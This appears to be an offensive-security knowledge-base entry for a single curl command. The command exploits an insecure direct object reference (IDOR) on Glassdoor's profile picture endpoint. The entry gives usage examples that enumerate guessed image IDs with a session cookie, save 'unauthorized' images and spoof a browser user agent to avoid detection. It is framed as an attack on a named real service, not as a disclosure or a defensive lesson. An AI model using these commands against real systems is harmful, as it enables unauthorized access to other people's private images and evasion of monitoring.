---
data: >-
  curl -X GET
  'https://www.glassdoor.com/profile/picture?image_id=TARGET_IMAGE_ID' -H
  'Cookie: session=your_session_cookie' -H 'User-Agent: Mozilla/5.0'
tags:
  - web
  - recon
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.670Z'
id: 5600b5ca-d214-4af9-b546-5756a4a6d102
verified: false
validated: true
submitted: true
---
# curl-idor-request

## Command

```bash
curl -X GET 'https://www.glassdoor.com/profile/picture?image_id=TARGET_IMAGE_ID' -H 'Cookie: session=your_session_cookie' -H 'User-Agent: Mozilla/5.0'
```

## Description

This command uses curl to send an HTTP GET request to the Glassdoor profile picture endpoint with a manipulated image ID, exploiting IDOR to retrieve unauthorized user images. Use it after extracting a base ID from a legitimate upload response to probe adjacent or guessed IDs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `'https://www.glassdoor.com/profile/picture?image_id=TARGET_IMAGE_ID'` | The target URL with the manipulated image ID parameter | Yes |
| `-H 'Cookie: session=your_session_cookie'` | Authentication cookie from a valid session | Yes |
| `-H 'User-Agent: Mozilla/5.0'` | Mimics a browser user agent to avoid detection | No |
| `-o output.jpg` | Saves the response (image) to a file | No |

## Examples

### Basic Usage

```bash
curl -X GET 'https://www.glassdoor.com/profile/picture?image_id=12346' -H 'Cookie: session=abc123'
```

### Advanced Usage

```bash
curl -X GET 'https://www.glassdoor.com/profile/picture?image_id=12346' -H 'Cookie: session=abc123' -H 'User-Agent: Mozilla/5.0' -o unauthorized_image.jpg --verbose
```

## Expected Output

Successful execution returns the raw binary data of the profile picture (e.g., starting with image headers like PNG or JPEG). Use `--verbose` for headers confirming 200 OK status. Errors like 403/404 indicate failed access or invalid ID.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-Profile-Picture-Upload]]
